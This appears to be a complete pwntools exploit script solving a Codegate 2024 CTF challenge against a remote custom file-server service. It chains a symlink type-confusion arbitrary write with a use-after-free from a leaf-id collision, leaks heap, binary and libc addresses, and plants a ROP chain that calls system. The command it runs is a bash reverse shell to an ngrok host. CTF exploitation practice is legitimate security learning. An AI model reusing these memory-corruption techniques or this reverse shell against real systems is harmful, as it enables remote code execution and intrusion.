from pwn import *
from dataclasses import dataclass
from contextlib import contextmanager
from collections import defaultdict
import struct

context.arch = "amd64"

#s = remote("jammy", 8811)
s = remote("3.35.170.102", 8811)

_suppress_replies = False
_suppress_replies_count = 0
@contextmanager
def suppress_replies():
    global _suppress_replies, _suppress_replies_count
    _suppress_replies = True
    _suppress_replies_count = 0
    yield
    for i in range(_suppress_replies_count):
        rop, rlen = struct.unpack("<BxH", s.recvn(4))
        rpay = s.recvn(rlen)
    _suppress_replies = False
    _suppress_replies_count = 0

def rcmd(opcode, payload):
    s.send(struct.pack("<BxH", opcode, len(payload)) + payload)
    if _suppress_replies:
        global _suppress_replies_count
        _suppress_replies_count += 1
    else:
        rop, rlen = struct.unpack("<BxH", s.recvn(4))
        rpay = s.recvn(rlen)
        assert rop == 0x99
        return rpay

def cmd(opcode, payload):
    rpay = rcmd(opcode, payload)
    if not _suppress_replies:
        assert rpay == b"SUCC", f"Command failed, result is {rpay}"

def read(path: str):
    return rcmd(1, path.encode("latin1"))

def write(fn: str, contents: bytes):
    fn = fn.encode("latin1")
    assert len(fn) <= 0x30
    cmd(2, struct.pack("<48sH", fn, len(contents)))
    cmd(0, contents)

def mkdir(path: str):
    cmd(3, path.encode("latin1"))

def link(linktype: int, fn1: str | bytes, fn2: str):
    if not isinstance(fn1, bytes):
        fn1 = fn1.encode("latin1")
    fn2 = fn2.encode("latin2")
    payload = struct.pack("<BH", linktype, len(fn1)) + fn1 + struct.pack("<H", len(fn2)) + fn2
    cmd(4, payload)

def rmtree(path: str):
    cmd(6, path.encode("latin1"))

def chdir(path: str):
    cmd(7, path.encode("latin1"))

@dataclass
class Stat:
    id: int
    leaf_id: int
    refcount: int
    dtype: int
    ctime: int
    mtime: int
    atime: int
    fsize: int
    name: str
    path: str

def scandir():
    buf = rcmd(8, b"")
    result = []
    ptr = 0
    while ptr < len(buf):
        id, leaf_id, refcount, dtype, ctime, mtime, atime, fsize, namelen, name, fullpath_len = struct.unpack(
            "<HHII4xQQQQI48sI", buf[ptr:ptr + 0x68])
        ptr += 0x68
        fullpath = buf[ptr:ptr + fullpath_len]
        ptr += fullpath_len
        result.append(Stat(id, leaf_id, refcount, dtype, ctime, mtime, atime, fsize, name.rstrip(b"\0").decode("latin1"), fullpath.decode("latin1")))
    return result

def ping():
    res = rcmd(10, b"PING")
    assert res == b"PONG"

def _arb_write(address, data):
    """ type confusion when overwriting a regular file with a symlink - can be abused for an arbitrary write """
    assert len(data) <= 0x10
    assert b"\x00" not in p64(address)[:6]
    chdir("/")
    rmtree("write")
    write("write", b"x")
    # one less for root dir
    link(1, b"a" * 0x27 + p64(address), "write")
    write("write", data)

def arb_write(address, data):
    for i in range(0, len(data), 16):
        _arb_write(address + i, data[i:i+16])

ping()
write("write", b"x")
mkdir("a")
mkdir("b")
# this is also useful for heap alignment
write("read", b"x")

# make a bunch of files - birthday paradox says we need ~256 to have a decent chance of a collision
chdir("/a")
with suppress_replies():
    for i in range(512):
        write(str(i), b"x")

seen = defaultdict(list)
for res in scandir():
    seen[res.leaf_id].append(res.name)

for leaf_id in seen:
    if len(seen[leaf_id]) == 2:
        break
else:
    raise Exception("sorry, unlucky, no birthday for you")

# use collision to free an in-use leaf
fn1, fn2 = seen[leaf_id]
write(fn1, b"a" * 0x90)
# rmtree will free `buf` and set it to NULL, so we need to set
# fn1's size to zero to avoid `memcpy(..., NULL, size)` in the fn1 write later
write(fn1, b"")
rmtree(fn2)

# immediately reallocate freed leaf using a symlink
link(1, b"a" * 0xff, "/b/dummy1")
# free leaf buffer again (frees the 0x100 buf2 after resizing to 0x200)
write(fn1, b"a" * 0x200)
# obtain leaked heap address by reading the symlink (tcache forward pointer)
chdir("/b")
heap_leak = u64(scandir()[0].path.encode("latin1").ljust(8, b"\0"))
log.info("heap leak: %x", heap_leak)

# deobfuscate heap pointer
heap_chunk = heap_leak
heap_chunk = (heap_chunk >> 12) ^ heap_leak
heap_chunk = (heap_chunk >> 12) ^ heap_leak
heap_chunk = (heap_chunk >> 12) ^ heap_leak
log.info("heap chunk: %x", heap_chunk)

# overwrite /read's dbuf for arb read
read_leaf = heap_chunk - 0x21c50
def arb_read(address, size):
    arb_write(read_leaf + 0x28, p64(address) + p64(size))
    return read("/read")

# do the usual chain to get rop on the stack
exe_base = u64(arb_read(heap_chunk - 0x21fd8, 8)) - 0x504a
log.info("exe base: %x", exe_base)

libc_base = u64(arb_read(exe_base + 0x6e80, 8)) - 0x12bbb0 # recv@got
log.info("libc base: %x", libc_base)

environ = u64(arb_read(libc_base + 0x20ad58, 8))
log.info("environ: %x", environ)

cave = exe_base + 0x7810

rop = flat([
    libc_base + 0x00110fb7, p64(cave + 0x100), # pop rdi ; ret
    libc_base + 0x58740, # system
])
log.info("rop: %s", rop.hex())
arb_write(cave, rop)

# we're connected to a socket, not to stdin/out, so use a reverse shell
shellcmd = b"/bin/bash -c '/bin/bash -i >& /dev/tcp/0.tcp.ngrok.io/19400 0>&1'\0"
arb_write(cave + 0x100, shellcmd)

root_gadget = p64(libc_base + 0x001109ae) + p64(cave) # pop rsp ; ret
arb_write(environ - 0x1e8, root_gadget)
s.interactive()

# codegate2024{7e412d247dfcc6fa024740fda129afe58b816107893d3ec44e14f2c9efb321624f84b019b5ba1134f61dac6281570363cb208cc65c}
